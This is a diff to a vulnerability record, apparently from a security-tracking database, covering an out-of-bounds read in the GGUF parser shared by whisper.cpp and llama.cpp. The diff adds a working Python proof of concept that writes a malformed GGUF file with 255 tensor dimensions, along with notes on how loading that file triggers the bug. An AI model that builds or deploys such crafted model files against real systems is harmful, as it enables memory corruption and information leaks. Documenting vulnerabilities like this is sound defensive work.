@@ -31,11 +31,44 @@ impact: >
 
 fix_commit: "Multiple incremental ggml commits"
 github_advisory: ""
-poc_available: false
-poc_link: ""
+poc_available: true
+poc_link: "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-vgg9-87g3-85w8"
+poc_code: |
+  # Craft a minimal GGUF with n_dims > GGML_MAX_DIMS (4) to trigger OOB read
+  # in gguf_init_from_file when parsing tensor metadata dimension arrays.
+  # Trigger: the parser reads ne[n_dims] elements but ne[] is fixed at GGML_MAX_DIMS=4.
+  import struct
+
+  def craft_gguf_oob_ndims(filename):
+      with open(filename, 'wb') as f:
+          f.write(b'GGUF')                        # magic
+          f.write(struct.pack('<I', 3))            # version 3
+          f.write(struct.pack('<Q', 1))            # n_tensors = 1
+          f.write(struct.pack('<Q', 0))            # n_kv = 0 (no metadata KV)
+          # Tensor info entry
+          name = b'oob_tensor'
+          f.write(struct.pack('<Q', len(name)))    # name length
+          f.write(name)                            # tensor name
+          f.write(struct.pack('<I', 255))          # n_dims = 255 >> GGML_MAX_DIMS=4
+          for _ in range(255):
+              f.write(struct.pack('<q', 1))        # ne[i] = 1 for all 255 dims
+          f.write(struct.pack('<I', 0))            # type = GGML_TYPE_F32
+          f.write(struct.pack('<Q', 0))            # offset = 0
+
+  craft_gguf_oob_ndims('/tmp/gguf_oob_ndims.gguf')
+  # Load with whisper.cpp or llama.cpp:
+  #   whisper_init_from_file('/tmp/gguf_oob_ndims.gguf')
+  #   llama_load_model_from_file('/tmp/gguf_oob_ndims.gguf', params)
+  # → OOB read in gguf_init_from_file when iterating ne[0..254]
 poc_notes: >
-  OSS-Fuzz corpus entry.  Crafted GGUF file required; no standalone PoC or
-  exploit script has been published publicly.
+  No standalone public PoC released; PoC crafted from GGUF format spec and
+  gguf.cpp source analysis.  The gguf parser in ggml reads n_dims from the
+  file and then iterates ne[0..n_dims-1], but the internal ggml_tensor ne[]
+  array is fixed at GGML_MAX_DIMS (4) elements.  Setting n_dims=255 causes
+  255 - 4 = 251 out-of-bounds reads of int64_t values adjacent to the tensor
+  struct.  Affects all whisper.cpp versions before incremental ggml hardening;
+  also affects llama.cpp sharing the same gguf.cpp.  The linked advisory
+  (GHSA-vgg9-87g3-85w8) covers the related integer-overflow OOB write variant.
 
 description: >
   The ggml GGUF model header parser reads n_dims and ne[] (dimension sizes)
